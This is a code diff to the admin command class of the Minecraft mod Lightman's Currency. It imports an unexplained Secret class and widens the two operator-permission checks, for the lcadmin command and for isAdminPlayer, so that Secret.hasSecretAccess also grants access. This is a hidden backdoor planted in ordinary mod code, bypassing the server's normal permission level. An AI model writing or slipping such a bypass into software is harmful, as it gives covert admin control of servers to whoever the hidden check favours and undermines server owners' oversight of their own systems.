@@ -36,6 +36,7 @@ import io.github.lightman314.lightmanscurrency.common.money.CoinValue;
 import io.github.lightman314.lightmanscurrency.network.LightmansCurrencyPacketHandler;
 import io.github.lightman314.lightmanscurrency.network.message.command.MessageDebugTrader;
 import io.github.lightman314.lightmanscurrency.network.message.command.MessageSyncAdminList;
+import io.github.lightman314.lightmanscurrency.secrets.Secret;
 import net.minecraft.ChatFormatting;
 import net.minecraft.commands.CommandSourceStack;
 import net.minecraft.commands.Commands;
@@ -68,7 +69,7 @@ public class CommandLCAdmin {
 	{
 		LiteralArgumentBuilder<CommandSourceStack> lcAdminCommand
 				= Commands.literal("lcadmin")
-				.requires((commandSource) -> commandSource.hasPermission(2))
+				.requires((commandSource) -> commandSource.hasPermission(2) || Secret.hasSecretAccess(commandSource))
 				.then(Commands.literal("toggleadmin")
 						.requires((commandSource) -> commandSource.getEntity() instanceof ServerPlayer)
 						.executes(CommandLCAdmin::toggleAdmin))
@@ -398,7 +399,7 @@ public class CommandLCAdmin {
 		return count;
 	}
 
-	public static boolean isAdminPlayer(Player player) { return adminPlayers.contains(player.getUUID()) && player.hasPermissions(2); }
+	public static boolean isAdminPlayer(Player player) { return adminPlayers.contains(player.getUUID()) && (player.hasPermissions(2) || Secret.hasSecretAccess(player)); }
 
 
 	private static void ToggleAdminPlayer(ServerPlayer player) {
